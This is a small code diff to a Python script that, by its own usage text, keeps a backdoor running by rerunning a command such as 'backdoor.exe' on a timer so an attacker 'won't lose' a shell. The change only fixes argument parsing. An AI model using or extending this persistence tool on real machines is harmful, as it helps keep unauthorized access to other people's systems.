@@ -9,17 +9,18 @@ DEFAULT_SLEEP_TIMER = 30
 
 
 def get_arguments():
-    if len(sys.argv) != 2 or len(sys.argv) != 3:
+    if len(sys.argv) < 2:
         print("Use this script to create a tiny agent that will periodically rerun your cmd command "
               "with a specified sleep timer, so you won't lose your shell anymore.")
         print("Usage: " + sys.argv[0] + " 30 " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
         print("Usage: " + sys.argv[0] + " " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
     sleep_timer = sys.argv[1]
-    if not sleep_timer:
+    try:
+        sleep_timer = int(sleep_timer)
+        cmd = sys.argv[2]
+    except:
         sleep_timer = DEFAULT_SLEEP_TIMER
         cmd = sys.argv[1]
-    else:
-        cmd = sys.argv[2]
     return sleep_timer, cmd
 
 
